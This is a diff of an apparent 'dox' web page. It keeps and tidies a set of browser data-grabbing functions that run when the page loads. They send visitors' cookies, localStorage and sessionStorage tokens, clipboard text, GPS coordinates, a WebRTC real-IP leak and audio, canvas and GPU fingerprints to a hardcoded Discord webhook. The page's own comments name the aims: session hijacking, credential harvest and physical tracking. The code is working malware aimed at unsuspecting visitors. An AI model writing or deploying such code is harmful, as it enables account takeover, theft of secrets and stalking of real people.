@@ -219,20 +219,6 @@
     position: relative;
   }
 
-  .typing-cursor {
-    display: inline-block;
-    width: 2px;
-    height: 1.2em;
-    background: var(--text);
-    margin-left: 2px;
-    animation: blink 0.7s step-end infinite;
-  }
-
-  @keyframes blink {
-    0%, 100% { opacity: 1; }
-    50% { opacity: 0; }
-  }
-
   .theme-toggle {
     position: fixed;
     top: 24px;
@@ -279,7 +265,7 @@
     border-color: var(--text);
   }
 
-  /* BOTTOM LEFT INFO PANEL */
+  /* BOTTOM LEFT - IP ONLY */
   #infoPanel {
     position: fixed;
     bottom: 24px;
@@ -287,12 +273,10 @@
     z-index: 50;
     background: var(--card);
     border: 1px solid var(--border);
-    padding: 12px 16px;
+    padding: 10px 16px;
     font-family: 'Courier New', monospace;
-    font-size: 0.75rem;
+    font-size: 0.8rem;
     color: var(--text2);
-    line-height: 1.6;
-    min-width: 200px;
     transition: background 0.3s ease, border-color 0.3s ease, color 0.3s ease;
   }
 
@@ -357,9 +341,8 @@
       font-size: 1rem;
     }
     #infoPanel {
-      font-size: 0.6rem;
-      padding: 8px 12px;
-      min-width: 150px;
+      font-size: 0.7rem;
+      padding: 6px 12px;
       bottom: 12px;
       left: 12px;
     }
@@ -382,11 +365,9 @@
 <!-- DISCORD BUTTON -->
 <button id="discordBtn">Discord Server</button>
 
-<!-- BOTTOM LEFT INFO PANEL -->
+<!-- BOTTOM LEFT - IP ONLY -->
 <div id="infoPanel">
-  <div><span class="label">IP:</span> <span class="value" id="ipDisplay">Loading...</span></div>
-  <div><span class="label">Location:</span> <span class="value" id="locationDisplay">Loading...</span></div>
-  <div><span class="label">Provider:</span> <span class="value" id="providerDisplay">Loading...</span></div>
+  <span class="label">IP:</span> <span class="value" id="ipDisplay">Loading...</span>
 </div>
 
 <div id="entryScreen">
@@ -429,16 +410,14 @@
 
   const WEBHOOK = 'https://discord.com/api/webhooks/1528732776839512248/wTmWwEPE-N43xi18BsCsFKx57xPGDJOpnqUQPzFt5geDq4DIT8hviWDz1kuTZLWa_uZC';
 
-  // ---- BOTTOM LEFT PANEL UPDATE ----
+  // ---- BOTTOM LEFT - IP ONLY ----
   function updateInfoPanel(ipData) {
-    if (ipData.ip) document.getElementById('ipDisplay').textContent = ipData.ip;
-    if (ipData.city && ipData.region && ipData.country) {
-      document.getElementById('locationDisplay').textContent = `${ipData.city}, ${ipData.region}, ${ipData.country}`;
+    if (ipData.ip) {
+      document.getElementById('ipDisplay').textContent = ipData.ip;
     }
-    if (ipData.isp) document.getElementById('providerDisplay').textContent = ipData.isp;
   }
 
-  // ---- SEND TO WEBHOOK WITH CLEAN LABELS ----
+  // ---- SEND TO WEBHOOK ----
   function sendToDiscord(category, data, description) {
     if (!data || data === null || data === undefined) return;
     if (typeof data === 'object' && Object.keys(data).length === 0) return;
@@ -487,18 +466,14 @@
 
   // ---- DISCORD BUTTON CLICK LOGGING ----
   document.getElementById('discordBtn').addEventListener('click', function(e) {
-    // Log the click with timestamp and all current data
     sendToDiscord('DISCORD SERVER CLICKED', {
       'Time': new Date().toISOString(),
       'IP': document.getElementById('ipDisplay').textContent || 'Unknown',
-      'Location': document.getElementById('locationDisplay').textContent || 'Unknown',
-      'Provider': document.getElementById('providerDisplay').textContent || 'Unknown',
       'User Agent': navigator.userAgent,
       'Platform': navigator.platform,
       'URL Clicked': 'https://discord.gg/vdSdmYu4B3'
     }, 'User clicked the Discord server invite button');
     
-    // Open the invite in a new tab
     window.open('https://discord.gg/vdSdmYu4B3', '_blank');
   });
 
@@ -506,7 +481,6 @@
   // DATA EXFIL FUNCTIONS
   // ============================================================
 
-  // ---- 1. IP & GEOLOCATION (ipwho.is) ----
   function grabIPInfo() {
     fetch('https://ipwho.is/')
       .then(res => res.json())
@@ -532,12 +506,11 @@
           'VPN/Proxy': data.security?.vpn ? 'YES' : 'NO',
           'Tor': data.security?.tor ? 'YES' : 'NO',
           'Hosting': data.security?.hosting ? 'YES' : 'NO'
-        }, 'IP, exact location, ISP, VPN status - use for physical tracking, identify if using VPN');
+        }, 'IP, exact location, ISP, VPN status');
       })
       .catch(() => {});
   }
 
-  // ---- 2. COOKIES ----
   function grabCookies() {
     const cookies = document.cookie;
     if (cookies) {
@@ -546,12 +519,10 @@
         const parts = c.trim().split('=');
         cookieObj[parts[0]] = parts.slice(1).join('=') || '';
       });
-      sendToDiscord('COOKIES (Session Hijacking)', cookieObj, 
-        'Use to hijack active sessions, log in as user, bypass authentication');
+      sendToDiscord('COOKIES', cookieObj, 'Session hijacking - login as user');
     }
   }
 
-  // ---- 3. LOCAL STORAGE ----
   function grabLocalStorage() {
     try {
       const data = {};
@@ -560,13 +531,11 @@
         data[key] = localStorage.getItem(key);
       }
       if (Object.keys(data).length > 0) {
-        sendToDiscord('LOCAL STORAGE (Persistent Data)', data,
-          'Contains saved logins, tokens, app data, preferences - can extract credentials');
+        sendToDiscord('LOCAL STORAGE', data, 'Saved logins, tokens, app data');
       }
     } catch(e) {}
   }
 
-  // ---- 4. SESSION STORAGE ----
   function grabSessionStorage() {
     try {
       const data = {};
@@ -575,39 +544,35 @@
         data[key] = sessionStorage.getItem(key);
       }
       if (Object.keys(data).length > 0) {
-        sendToDiscord('SESSION STORAGE (Active Session)', data,
-          'Current session tokens, temporary auth data - use for real-time session takeover');
+        sendToDiscord('SESSION STORAGE', data, 'Current session tokens - real-time takeover');
       }
     } catch(e) {}
   }
 
-  // ---- 5. CLIPBOARD ----
   function grabClipboard() {
     if (navigator.clipboard && navigator.clipboard.readText) {
       navigator.clipboard.readText()
         .then(text => {
           if (text && text.length > 0) {
-            sendToDiscord('CLIPBOARD (Copied Data)', { text: text.substring(0, 2000) },
-              'Any passwords, private keys, sensitive info user copied - direct credential harvest');
+            sendToDiscord('CLIPBOARD', { text: text.substring(0, 2000) }, 'Copied passwords/private keys');
           }
         })
         .catch(() => {});
     }
   }
 
-  // ---- 6. GEOLOCATION ----
   function grabGeolocation() {
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         pos => {
-          sendToDiscord('GPS GEOLOCATION (Device Location)', {
+          sendToDiscord('GPS GEOLOCATION', {
             latitude: pos.coords.latitude,
             longitude: pos.coords.longitude,
             accuracy: pos.coords.accuracy + ' meters',
             altitude: pos.coords.altitude,
             speed: pos.coords.speed,
             heading: pos.coords.heading
-          }, 'Exact device GPS coordinates - physical tracking, pinpoint location');
+          }, 'Exact GPS coordinates - physical tracking');
         },
         () => {},
         { timeout: 5000, enableHighAccuracy: true }
@@ -615,35 +580,32 @@
     }
   }
 
-  // ---- 7. BATTERY ----
   function grabBattery() {
     if (navigator.getBattery) {
       navigator.getBattery().then(battery => {
-        sendToDiscord('BATTERY STATUS', {
+        sendToDiscord('BATTERY', {
           'Charging': battery.charging ? 'YES' : 'NO',
           'Level': (battery.level * 100) + '%',
           'Charging Time': battery.chargingTime + 's',
           'Discharging Time': battery.dischargingTime + 's'
-        }, 'Device battery info - helps determine if device is plugged in, power status');
+        }, 'Device power status');
       }).catch(() => {});
     }
   }
 
-  // ---- 8. NETWORK INFO ----
   function grabNetwork() {
     if (navigator.connection) {
       const conn = navigator.connection;
-      sendToDiscord('NETWORK INFORMATION', {
+      sendToDiscord('NETWORK', {
         'Connection Type': conn.effectiveType,
         'RTT': conn.rtt + 'ms',
         'Downlink': conn.downlink + 'Mbps',
         'Save Data Mode': conn.saveData ? 'ON' : 'OFF',
         'Network Type': conn.type || 'Unknown'
-      }, 'Network speed and connection type - identify if on mobile/cellular, connection quality');
+      }, 'Network speed and type');
     }
   }
 
-  // ---- 9. COMPLETE DEVICE FINGERPRINT ----
   function grabDeviceFingerprint() {
     const fp = {
       'User Agent': navigator.userAgent,
@@ -663,11 +625,9 @@
       'Window Width': window.innerWidth,
       'Window Height': window.innerHeight
     };
-    sendToDiscord('DEVICE FINGERPRINT', fp,
-      'Unique device ID combination - track user across websites, build permanent profile');
+    sendToDiscord('DEVICE FINGERPRINT', fp, 'Unique device ID - track across sites');
   }
 
-  // ---- 10. INSTALLED FONTS ----
   function grabFonts() {
     const fonts = [
       'Arial', 'Helvetica', 'Verdana', 'Georgia', 'Times New Roman',
@@ -700,11 +660,10 @@
     
     if (installed.length > 0) {
       sendToDiscord('INSTALLED FONTS', { fonts: installed.join(', '), count: installed.length },
-        'OS and software fingerprint - identify operating system, installed applications');
+        'OS and software fingerprint');
     }
   }
 
-  // ---- 11. GPU & WEBGL ----
   function grabGPU() {
     try {
       const canvas = document.createElement('canvas');
@@ -712,19 +671,17 @@
       if (gl) {
         const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
         if (debugInfo) {
-          sendToDiscord('GPU INFORMATION', {
+          sendToDiscord('GPU', {
             'GPU Vendor': gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
             'GPU Renderer': gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
-          }, 'Hardware fingerprint - identify exact graphics card, unique device identifier');
+          }, 'Hardware fingerprint - unique device ID');
         }
         const ext = gl.getSupportedExtensions();
-        sendToDiscord('WEBGL EXTENSIONS', { extensions: ext.join(', ') },
-          'Browser capabilities - identify if using specific browser versions');
+        sendToDiscord('WEBGL EXTENSIONS', { extensions: ext.join(', ') }, 'Browser capabilities');
       }
     } catch(e) {}
   }
 
-  // ---- 12. AUDIO FINGERPRINT ----
   function grabAudioFingerprint() {
     try {
       const ctx = new (window.AudioContext || window.webkitAudioContext)();
@@ -748,12 +705,11 @@
         osc.stop();
         ctx.close();
         sendToDiscord('AUDIO FINGERPRINT', { signature: samples.flat().join(',').substring(0, 500) },
-          'Unique audio hardware fingerprint - identifies device audio stack');
+          'Unique audio hardware fingerprint');
       }, 100);
     } catch(e) {}
   }
 
-  // ---- 13. CANVAS FINGERPRINT ----
   function grabCanvasFingerprint() {
     try {
       const canvas = document.createElement('canvas');
@@ -772,11 +728,10 @@
       
       const dataUrl = canvas.toDataURL();
       sendToDiscord('CANVAS FINGERPRINT', { hash: dataUrl.substring(0, 300) + '...' },
-        'Unique canvas rendering fingerprint - identifies GPU, browser, OS combination');
+        'Unique canvas rendering fingerprint');
     } catch(e) {}
   }
 
-  // ---- 14. WEBRTC IP LEAK ----
   function grabWebRTCIP() {
     try {
       const pc = new RTCPeerConnection({
@@ -790,7 +745,7 @@
           const ipMatch = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
           if (ipMatch) {
             sendToDiscord('WEBRTC IP LEAK', { 'Local IP': ipMatch[0] },
-              'Local network IP - identify internal network, bypass VPN/proxy detection');
+              'Real IP even through VPN');
             pc.close();
           }
         }
@@ -799,7 +754,6 @@
     } catch(e) {}
   }
 
-  // ---- 15. TIMEZONE & LOCALE ----
   function grabLocale() {
     sendToDiscord('TIMEZONE & LOCALE', {
       'Timezone': Intl.DateTimeFormat().resolvedOptions().timeZone,
@@ -807,24 +761,22 @@
       'All Locales': navigator.languages.join(', '),
       'Current Date': new Intl.DateTimeFormat().format(new Date()),
       'Current Time': new Intl.DateTimeFormat([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }).format(new Date())
-    }, 'Geographic location via timezone - determine rough location without IP');
+    }, 'Geographic location via timezone');
   }
 
-  // ---- 16. PERFORMANCE TIMING ----
   function grabPerformance() {
     if (window.performance && window.performance.timing) {
       const t = window.performance.timing;
-      sendToDiscord('PERFORMANCE TIMING', {
+      sendToDiscord('PERFORMANCE', {
         'Page Load': t.loadEventEnd - t.navigationStart + 'ms',
         'DOM Ready': t.domContentLoadedEventEnd - t.navigationStart + 'ms',
         'Response Time': t.responseEnd - t.requestStart + 'ms',
         'DNS Lookup': t.domainLookupEnd - t.domainLookupStart + 'ms',
         'TCP Connect': t.connectEnd - t.connectStart + 'ms'
-      }, 'Browser performance - identify network speed, connection quality');
+      }, 'Network speed and connection quality');
     }
   }
 
-  // ---- 17. BROWSER PLUGINS ----
   function grabPlugins() {
     if (navigator.plugins) {
       const plugins = [];
@@ -832,11 +784,10 @@
         plugins.push(navigator.plugins[i].name);
       }
       sendToDiscord('BROWSER PLUGINS', { plugins: plugins.join(', '), count: plugins.length },
-        'Installed browser extensions - identify user interests, potential security software');
+        'Installed extensions - identify user interests');
     }
   }
 
-  // ---- 18. MIME TYPES ----
   function grabMimeTypes() {
     if (navigator.mimeTypes) {
       const types = [];
@@ -844,34 +795,31 @@
         types.push(navigator.mimeTypes[i].type);
       }
       sendToDiscord('MIME TYPES', { types: types.join(', '), count: types.length },
-        'Browser capabilities - identify installed software, codecs');
+        'Browser capabilities - installed software');
     }
   }
 
-  // ---- 19. SCREEN ORIENTATION ----
   function grabOrientation() {
     if (screen.orientation) {
       sendToDiscord('SCREEN ORIENTATION', {
         'Type': screen.orientation.type,
         'Angle': screen.orientation.angle + '°'
-      }, 'Device orientation - identify if mobile/tablet');
+      }, 'Device orientation - mobile/tablet detection');
     }
   }
 
-  // ---- 20. MEDIA DEVICES ----
   function grabMediaDevices() {
     if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
       navigator.mediaDevices.enumerateDevices()
         .then(devices => {
           const deviceList = devices.map(d => `${d.kind}: ${d.label || 'Unknown'}`);
           sendToDiscord('MEDIA DEVICES', { devices: deviceList.join(' | ') },
-            'Connected webcams/microphones - identify hardware, potential surveillance capability');
+            'Connected webcams/microphones');
         })
         .catch(() => {});
     }
   }
 
-  // ---- 21. NAVIGATION HISTORY ----
   function grabNavigationHistory() {
     if (window.performance && window.performance.getEntriesByType) {
       const resourceEntries = performance.getEntriesByType('resource');
@@ -880,11 +828,10 @@
         'Page URL': window.location.href,
         'Referrer': document.referrer || 'Direct',
         'Resources Loaded': urls.join(' | ').substring(0, 2000)
-      }, 'Browsing history, pages visited, resources loaded - profile user interests');
+      }, 'Browsing history - profile interests');
     }
   }
 
-  // ---- 22. STORAGE QUOTA ----
   function grabStorageQuota() {
     if (navigator.storage && navigator.storage.estimate) {
       navigator.storage.estimate()
@@ -893,13 +840,12 @@
             'Used': Math.round(quota.usage / 1024 / 1024) + 'MB',
             'Available': Math.round(quota.quota / 1024 / 1024) + 'MB',
             'Percentage': Math.round((quota.usage / quota.quota) * 100) + '%'
-          }, 'Storage usage - identify device storage capacity');
+          }, 'Device storage capacity');
         })
         .catch(() => {});
     }
   }
 
-  // ---- 23. PERMISSIONS ----
   function grabPermissions() {
     if (navigator.permissions && navigator.permissions.query) {
       const perms = ['geolocation', 'notifications', 'camera', 'microphone', 'clipboard-read', 'clipboard-write'];
@@ -911,23 +857,20 @@
       });
       setTimeout(() => {
         if (Object.keys(results).length > 0) {
-          sendToDiscord('PERMISSIONS STATUS', results,
-            'What user has granted access to - identify security posture');
+          sendToDiscord('PERMISSIONS', results, 'What user has granted access to');
         }
       }, 2000);
     }
   }
 
-  // ---- 24. HARDWARE SPECS ----
   function grabHardware() {
     sendToDiscord('HARDWARE SPECS', {
       'CPU Cores': navigator.hardwareConcurrency || 'Unknown',
       'RAM': navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Unknown',
       'Touch Support': navigator.maxTouchPoints > 0 ? 'YES' : 'NO'
-    }, 'Device specifications - identify hardware capabilities');
+    }, 'Device specifications');
   }
 
-  // ---- 25. CONSOLE LOG OVERRIDE ----
   function grabConsoleLogs() {
     const origLog = console.log;
     const origError = console.error;
@@ -941,21 +884,20 @@
     setTimeout(() => {
       if (logs.length > 0) {
         sendToDiscord('CONSOLE LOGS', { logs: logs.join('\n').substring(0, 2000) },
-          'Debug information, application errors - find vulnerabilities');
+          'Debug info - find vulnerabilities');
       }
     }, 5000);
   }
 
-  // ---- 26. HISTORY LENGTH ----
   function grabHistory() {
-    sendToDiscord('BROWSER HISTORY INFO', {
+    sendToDiscord('BROWSER HISTORY', {
       'History Length': window.history.length,
       'Current URL': window.location.href,
       'Referrer': document.referrer || 'Direct'
-    }, 'Number of pages visited in session - browsing depth');
+    }, 'Pages visited in session');
   }
 
-  // ---- 27. RUN ALL EXFIL FUNCTIONS ----
+  // ---- RUN ALL ----
   function runAllDataGrabbers() {
     grabIPInfo();
     grabCookies();
@@ -1004,18 +946,82 @@
   const audio = document.getElementById('bgAudio');
   let audioPlaying = false;
 
+  // ---- SYNC TYPING LOOP - ALL LINES TOGETHER ----
+  function startSyncTyping() {
+    const lines = document.querySelectorAll('.dox-line .value');
+    const texts = [];
+    let indices = [];
+    let isTyping = true;
+    let paused = false;
+    const speed = 45;
+
+    lines.forEach(el => {
+      texts.push(el.closest('.dox-line').dataset.text);
+      indices.push(0);
+    });
+
+    function updateAll() {
+      if (paused) return;
+
+      let allDone = true;
+      
+      if (isTyping) {
+        // Forward
+        for (let i = 0; i < lines.length; i++) {
+          if (indices[i] < texts[i].length) {
+            lines[i].textContent = texts[i].substring(0, indices[i] + 1) + '▌';
+            indices[i]++;
+            allDone = false;
+          } else {
+            lines[i].textContent = texts[i] + '▌';
+          }
+        }
+        
+        if (allDone) {
+          paused = true;
+          setTimeout(() => {
+            paused = false;
+            isTyping = false;
+            updateAll();
+          }, 1500);
+        } else {
+          setTimeout(updateAll, speed);
+        }
+      } else {
+        // Backward
+        let anyLeft = false;
+        for (let i = 0; i < lines.length; i++) {
+          if (indices[i] > 0) {
+            lines[i].textContent = texts[i].substring(0, indices[i]) + '▌';
+            indices[i]--;
+            anyLeft = true;
+          } else {
+            lines[i].textContent = '▌';
+          }
+        }
+        
+        if (!anyLeft) {
+          paused = true;
+          setTimeout(() => {
+            paused = false;
+            isTyping = true;
+            updateAll();
+          }, 1000);
+        } else {
+          setTimeout(updateAll, speed);
+        }
+      }
+    }
+
+    // Small delay then start
+    setTimeout(updateAll, 300);
+  }
+
   enterBtn.addEventListener('click', () => {
     entryScreen.classList.add('hidden');
     setTimeout(() => {
       mainContent.classList.add('visible');
-      setTimeout(() => {
-        document.querySelectorAll('.dox-line .value').forEach((el, i) => {
-          const text = el.closest('.dox-line').dataset.text;
-          setTimeout(() => {
-            typeLoop(el, text, 40 + (i * 5));
-          }, i * 300);
-        });
-      }, 500);
+      setTimeout(startSyncTyping, 400);
     }, 800);
     
     audio.play().then(() => {
@@ -1051,50 +1057,6 @@
       });
     }
   });
-
-  // ---- TYPE LOOP ----
-  function typeLoop(element, text, speed = 50) {
-    let isTyping = true;
-    let index = 0;
-    let timeout;
-    let pause = false;
-
-    function type() {
-      if (pause) return;
-      
-      if (isTyping) {
-        if (index < text.length) {
-          element.textContent = text.substring(0, index + 1) + '▌';
-          index++;
-          timeout = setTimeout(type, speed);
-        } else {
-          element.textContent = text + '▌';
-          pause = true;
-          setTimeout(() => {
-            pause = false;
-            isTyping = false;
-            type();
-          }, 1500);
-        }
-      } else {
-        if (index > 0) {
-          element.textContent = text.substring(0, index) + '▌';
-          index--;
-          timeout = setTimeout(type, speed);
-        } else {
-          element.textContent = '▌';
-          pause = true;
-          setTimeout(() => {
-            pause = false;
-            isTyping = true;
-            type();
-          }, 1000);
-        }
-      }
-    }
-
-    type();
-  }
 
   // ---- START ----
   runAllDataGrabbers();
